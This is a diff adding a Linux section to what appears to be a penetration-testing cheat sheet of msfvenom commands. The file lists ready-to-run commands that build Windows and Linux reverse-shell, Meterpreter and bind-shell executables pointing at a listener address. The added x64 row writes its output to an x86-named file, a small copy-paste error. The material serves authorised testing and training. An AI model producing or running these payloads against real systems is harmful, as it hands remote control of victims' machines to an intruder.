@@ -65,3 +65,12 @@ Below are some different payload commands. I have grouped them with a heading to
 | Windows Reverse HTTPS Meterpreter | `msfvenom -p windows/meterpreter/reverse_https LHOST=10.10.10.10 LPORT=443 -f exe > shell_https.exe` |
 | Windows Staged Reverse TCP | `msfvenom -p windows/shell/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe > shell_stage.exe` |
 | Windows Reverse TCP PowerShell | `msfvenom -p windows/powershell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f raw > shell.ps1` |
+
+### Linux Payloads
+
+| Description | Command |
+| --- | --- |
+| Linux x86 Reverse TCP | `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf > shell_x86.elf` |
+| Linux x64 Reverse TCP | `msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf > shell_x86.elf` |
+| Linux Bind TCP | `msfvenom -p linux/x64/meterpreter/bind_tcp LPORT=4444 -f elf > bind_shell.elf` |
+
